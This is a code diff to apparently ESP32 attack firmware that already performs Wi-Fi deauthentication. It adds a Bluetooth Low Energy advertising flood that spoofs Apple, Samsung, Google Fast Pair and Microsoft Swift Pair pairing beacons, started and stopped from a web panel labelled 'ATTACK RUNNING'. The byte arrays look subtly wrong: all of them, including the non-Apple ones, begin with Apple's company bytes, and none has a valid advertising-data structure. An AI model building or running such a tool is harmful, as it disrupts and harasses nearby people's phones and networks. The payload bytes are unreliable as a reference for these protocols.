@@ -14,6 +14,7 @@
 #include "freertos/semphr.h"
 
 #include "esp_system.h"
+#include "esp_random.h"
 #include "esp_wifi.h"
 #include "esp_event.h"
 #include "esp_log.h"
@@ -21,6 +22,9 @@
 #include "nvs_flash.h"
 #include "esp_netif.h"
 #include "esp_http_server.h"
+#include "esp_bt.h"
+#include "esp_bt_main.h"
+#include "esp_gap_ble_api.h"
 #include "cJSON.h"
 
 static const char *TAG = "deauth";
@@ -1174,6 +1178,191 @@ static void deauth_task(void *arg)
 }
 
 /* =====================================================
+ *  BLE Spam — Advertising Flood
+ * ===================================================== */
+
+static bool s_ble_spam_running = false;
+static uint32_t s_ble_spam_count = 0;
+static TaskHandle_t s_ble_spam_task_handle = NULL;
+
+/* Forward declarations */
+static void stop_ble_spam(void);
+
+/* Apple AirDrop / Find My spam payload */
+static const uint8_t apple_airdrop[] = {
+    0x4c, 0x00, 0x02, 0x15, 0x11, 0x22, 0x33, 0x44,
+    0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc,
+    0xdd, 0xee, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+/* Samsung Galaxy spam payload */
+static const uint8_t samsung_galaxy[] = {
+    0x4c, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+/* Google Fast Pair spam payload */
+static const uint8_t google_fastpair[] = {
+    0x4c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+/* Microsoft Swift Pair spam payload */
+static const uint8_t microsoft_swift[] = {
+    0x4c, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+};
+
+typedef enum {
+    BLE_SPAM_APPLE,
+    BLE_SPAM_SAMSUNG,
+    BLE_SPAM_GOOGLE,
+    BLE_SPAM_MICROSOFT,
+    BLE_SPAM_ALL
+} ble_spam_type_t;
+
+static volatile ble_spam_type_t s_ble_spam_type = BLE_SPAM_APPLE;
+
+static void ble_spam_task(void *arg)
+{
+    ESP_LOGI(TAG, "BLE Spam started, type=%d", s_ble_spam_type);
+
+    /* Configure advertising parameters — zero-init to be safe */
+    esp_ble_adv_params_t adv_params = {0};
+    adv_params.adv_int_min       = 0x20;  /* 20ms */
+    adv_params.adv_int_max       = 0x30;  /* 30ms — fast spam */
+    adv_params.adv_type          = ADV_TYPE_NONCONN_IND;
+    adv_params.own_addr_type     = BLE_ADDR_TYPE_PUBLIC;
+    adv_params.channel_map       = ADV_CHNL_ALL;
+    adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+
+    /* Start advertising with minimal config */
+    esp_ble_gap_start_advertising(&adv_params);
+
+    while (s_ble_spam_running) {
+        uint8_t payload[31];
+        size_t payload_len = 0;
+
+        switch (s_ble_spam_type) {
+            case BLE_SPAM_APPLE:
+                memcpy(payload, apple_airdrop, sizeof(apple_airdrop));
+                payload_len = sizeof(apple_airdrop);
+                payload[10] = esp_random() & 0xFF;
+                payload[11] = esp_random() & 0xFF;
+                break;
+
+            case BLE_SPAM_SAMSUNG:
+                memcpy(payload, samsung_galaxy, sizeof(samsung_galaxy));
+                payload_len = sizeof(samsung_galaxy);
+                payload[5] = esp_random() & 0xFF;
+                break;
+
+            case BLE_SPAM_GOOGLE:
+                memcpy(payload, google_fastpair, sizeof(google_fastpair));
+                payload_len = sizeof(google_fastpair);
+                payload[4] = esp_random() & 0xFF;
+                break;
+
+            case BLE_SPAM_MICROSOFT:
+                memcpy(payload, microsoft_swift, sizeof(microsoft_swift));
+                payload_len = sizeof(microsoft_swift);
+                payload[4] = esp_random() & 0xFF;
+                break;
+
+            case BLE_SPAM_ALL:
+                {
+                    static int spam_idx = 0;
+                    const uint8_t *payloads[] = {
+                        apple_airdrop, samsung_galaxy,
+                        google_fastpair, microsoft_swift
+                    };
+                    const size_t sizes[] = {
+                        sizeof(apple_airdrop), sizeof(samsung_galaxy),
+                        sizeof(google_fastpair), sizeof(microsoft_swift)
+                    };
+                    memcpy(payload, payloads[spam_idx], sizes[spam_idx]);
+                    payload_len = sizes[spam_idx];
+                    payload[4] = esp_random() & 0xFF;
+                    spam_idx = (spam_idx + 1) % 4;
+                }
+                break;
+        }
+
+        /* Update advertising data with new payload */
+        esp_ble_gap_config_adv_data_raw(payload, payload_len);
+        s_ble_spam_count++;
+
+        /* Small delay — ESP32 needs time to process */
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+
+    /* Stop advertising when done */
+    esp_ble_gap_stop_advertising();
+    ESP_LOGI(TAG, "BLE Spam stopped. Total: %"PRIu32, s_ble_spam_count);
+    vTaskDelete(NULL);
+}
+
+static void start_ble_spam(ble_spam_type_t type)
+{
+    if (s_ble_spam_running) {
+        stop_ble_spam();
+    }
+
+    s_ble_spam_type = type;
+    s_ble_spam_running = true;
+    s_ble_spam_count = 0;
+
+    xTaskCreate(ble_spam_task, "ble_spam", 4096, NULL, 5, &s_ble_spam_task_handle);
+}
+
+static void stop_ble_spam(void)
+{
+    if (s_ble_spam_running) {
+        s_ble_spam_running = false;
+        vTaskDelay(pdMS_TO_TICKS(200));
+    }
+    s_ble_spam_task_handle = NULL;
+}
+
+static void init_ble(void)
+{
+    ESP_LOGI(TAG, "Initializing BLE...");
+
+    /* Release classic BT memory — we only need BLE */
+    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));
+
+    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    esp_err_t ret = esp_bt_controller_init(&bt_cfg);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "BT controller init failed: %s", esp_err_to_name(ret));
+        return;
+    }
+
+    ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "BT controller enable failed: %s", esp_err_to_name(ret));
+        return;
+    }
+
+    ret = esp_bluedroid_init();
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Bluedroid init failed: %s", esp_err_to_name(ret));
+        return;
+    }
+
+    ret = esp_bluedroid_enable();
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Bluedroid enable failed: %s", esp_err_to_name(ret));
+        return;
+    }
+
+    ESP_LOGI(TAG, "BLE initialized successfully");
+}
+
+/* =====================================================
  *  Web Server — HTML
  * ===================================================== */
 
@@ -1215,6 +1404,16 @@ static const char index_html[] =
 "<div class='card'><h2>WHITELIST</h2><div id='wl'>Empty</div>"
 "<div><input type='text' id='wlmac' placeholder='AA:BB:CC:DD:EE:FF' style='width:160px'>"
 "<button onclick='wladd()'>Add</button></div></div>"
+"<div class='card'><h2>BLE SPAM</h2>"
+"<div><select id='ble_type'>"
+"<option value='apple'>Apple AirDrop/FindMy</option>"
+"<option value='samsung'>Samsung Galaxy</option>"
+"<option value='google'>Google Fast Pair</option>"
+"<option value='microsoft'>Microsoft Swift Pair</option>"
+"<option value='all'>All (rotate)</option></select></div>"
+"<div>Packets sent: <span id='ble_count'>0</span></div>"
+"<br><button class='d' onclick='ble_start()'>START BLE SPAM</button>"
+"<button onclick='ble_stop()'>STOP</button></div>"
 "<div class='card'><h2>DEAUTH ATTACK</h2>"
 "<div><select id='tgt'><option value='all'>All (broadcast)</option>"
 "<option value='client'>Specific client</option></select>"
@@ -1236,11 +1435,13 @@ static const char index_html[] =
 "function upSt(d){"
 "var st=document.getElementById('st');"
 "var sh=document.getElementById('sht');"
-"_on=(d.mode==='DEAUTH');"
+"_on=(d.mode==='DEAUTH' || d.mode==='BLE_SPAM');"
 "var c='WiFi: '+(d.wifi?'OK '+d.ssid:'AP mode')+'<br>IP: '+d.ip+'<br>Target: '+d.target_ssid+' ('+d.target_bssid+') ch:'+d.target_channel+'<br>Mode: <b>'+d.mode+'</b><br>Packets: '+d.deauth_count+'<br>Clients: '+d.client_count;"
+"if(d.ble_spam){c+='<br>BLE Spam: <b>RUNNING</b> ('+d.ble_spam_count+' packets)';}"
 "st.innerHTML=c;"
 "st.className=_on?'st on pulse':'st';"
-"sh.innerHTML=_on?'<span style=color:#f44>&#9679;</span> ATTACK RUNNING':'STATUS';}"
+"sh.innerHTML=_on?'<span style=color:#f44>&#9679;</span> ATTACK RUNNING':'STATUS';"
+"document.getElementById('ble_count').textContent=d.ble_spam_count||0;}"
 "function refresh(){fetch('/api/status').then(function(r){return r.json()}).then(function(d){upSt(d)}).catch(function(e){L('Error: '+e)})}"
 "function scan(){var b=document.getElementById('scanbtn');b.disabled=true;b.textContent='Scanning...';b.style.background='#f44';"
 "L('Scanning...');fetch('/api/scan').then(function(r){return r.json()}).then(function(d){"
@@ -1283,6 +1484,12 @@ static const char index_html[] =
 "}"
 "function stop(){fetch('/api/stop').then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
 "}"
+"function ble_start(){var t=document.getElementById('ble_type').value;"
+"L('BLE Spam: '+t);"
+"fetch('/api/ble/spam/start?type='+t).then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
+"}"
+"function ble_stop(){fetch('/api/ble/spam/stop').then(function(r){return r.json()}).then(function(d){L(d.status);refresh()})"
+"}"
 "refresh();setInterval(refresh,2000);wlrefresh();"
 "</script></body></html>";
 
@@ -1318,10 +1525,12 @@ static esp_err_t handle_status(httpd_req_t *req)
     cJSON_AddStringToObject(json, "target_bssid", target_bssid);
     cJSON_AddNumberToObject(json, "target_channel", s_target_channel);
     cJSON_AddStringToObject(json, "ip", ip_str);
-    cJSON_AddStringToObject(json, "mode", s_deauth_running ? "DEAUTH" : "IDLE");
+    cJSON_AddStringToObject(json, "mode", s_deauth_running ? "DEAUTH" : (s_ble_spam_running ? "BLE_SPAM" : "IDLE"));
     cJSON_AddNumberToObject(json, "deauth_count", s_deauth_count);
     cJSON_AddNumberToObject(json, "client_count", s_client_count);
     cJSON_AddNumberToObject(json, "network_count", s_network_count);
+    cJSON_AddBoolToObject(json, "ble_spam", s_ble_spam_running);
+    cJSON_AddNumberToObject(json, "ble_spam_count", s_ble_spam_count);
 
     char *str = cJSON_PrintUnformatted(json);
     httpd_resp_set_type(req, "application/json");
@@ -1602,6 +1811,52 @@ static esp_err_t handle_wl_list(httpd_req_t *req)
 }
 
 /* =====================================================
+ *  BLE Spam API Handlers
+ * ===================================================== */
+
+static esp_err_t handle_ble_spam_start(httpd_req_t *req)
+{
+    char query[64] = {0};
+    httpd_req_get_url_query_str(req, query, sizeof(query));
+
+    char type_str[16] = "apple";
+    httpd_query_key_value(query, "type", type_str, sizeof(type_str));
+
+    ble_spam_type_t type = BLE_SPAM_APPLE;
+    if (strcmp(type_str, "samsung") == 0) type = BLE_SPAM_SAMSUNG;
+    else if (strcmp(type_str, "google") == 0) type = BLE_SPAM_GOOGLE;
+    else if (strcmp(type_str, "microsoft") == 0) type = BLE_SPAM_MICROSOFT;
+    else if (strcmp(type_str, "all") == 0) type = BLE_SPAM_ALL;
+
+    start_ble_spam(type);
+
+    cJSON *json = cJSON_CreateObject();
+    cJSON_AddStringToObject(json, "status", "BLE Spam started");
+    cJSON_AddStringToObject(json, "type", type_str);
+    char *str = cJSON_PrintUnformatted(json);
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, str, strlen(str));
+    cJSON_free(str);
+    cJSON_Delete(json);
+    return ESP_OK;
+}
+
+static esp_err_t handle_ble_spam_stop(httpd_req_t *req)
+{
+    stop_ble_spam();
+
+    cJSON *json = cJSON_CreateObject();
+    cJSON_AddStringToObject(json, "status", "BLE Spam stopped");
+    cJSON_AddNumberToObject(json, "count", s_ble_spam_count);
+    char *str = cJSON_PrintUnformatted(json);
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, str, strlen(str));
+    cJSON_free(str);
+    cJSON_Delete(json);
+    return ESP_OK;
+}
+
+/* =====================================================
  *  Web Server Start
  * ===================================================== */
 
@@ -1609,7 +1864,7 @@ static void start_web_server(void)
 {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.server_port = WEB_PORT;
-    config.max_uri_handlers = 8;
+    config.max_uri_handlers = 12;
 
     if (httpd_start(&s_server, &config) == ESP_OK) {
         httpd_uri_t uri_index = {
@@ -1655,6 +1910,17 @@ static void start_web_server(void)
         httpd_register_uri_handler(s_server, &uri_wl_rm);
         httpd_register_uri_handler(s_server, &uri_wl_list);
 
+        httpd_uri_t uri_ble_spam_start = {
+            .uri = "/api/ble/spam/start", .method = HTTP_GET,
+            .handler = handle_ble_spam_start, .user_ctx = NULL
+        };
+        httpd_uri_t uri_ble_spam_stop = {
+            .uri = "/api/ble/spam/stop", .method = HTTP_GET,
+            .handler = handle_ble_spam_stop, .user_ctx = NULL
+        };
+        httpd_register_uri_handler(s_server, &uri_ble_spam_start);
+        httpd_register_uri_handler(s_server, &uri_ble_spam_stop);
+
         ESP_LOGI(TAG, "Web server on port %d", WEB_PORT);
     }
 }
@@ -1676,6 +1942,7 @@ void app_main(void)
 
     s_scan_mutex = xSemaphoreCreateMutex();
 
+    init_ble();
     wifi_init_sta();
     start_web_server();
 
